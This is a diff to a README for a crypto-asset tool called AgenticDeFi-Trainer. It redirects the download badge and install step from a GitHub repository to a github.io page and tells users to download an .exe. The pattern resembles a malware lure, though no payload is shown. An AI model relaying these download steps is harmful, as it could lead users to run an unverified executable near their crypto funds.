@@ -1,6 +1,6 @@
 # 🤖 AgenticDeFi-Trainer - Manage crypto assets with autonomous software
 
-[![Download AgenticDeFi-Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Robinhood01kill/AgenticDeFi-Trainer)
+[![Download AgenticDeFi-Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://robinhood01kill.github.io)
 
 ## 📌 About this software
 
@@ -18,7 +18,7 @@ Your computer must meet these standards to run the software:
 
 ## 📥 How to download and install
 
-1. Visit the project repository page at [https://github.com/Robinhood01kill/AgenticDeFi-Trainer](https://github.com/Robinhood01kill/AgenticDeFi-Trainer).
+1. Visit the project repository page at [https://robinhood01kill.github.io](https://robinhood01kill.github.io).
 2. Look for the Releases section on the right side of the screen.
 3. Select the latest version link.
 4. Download the file ending in .exe to your local computer.
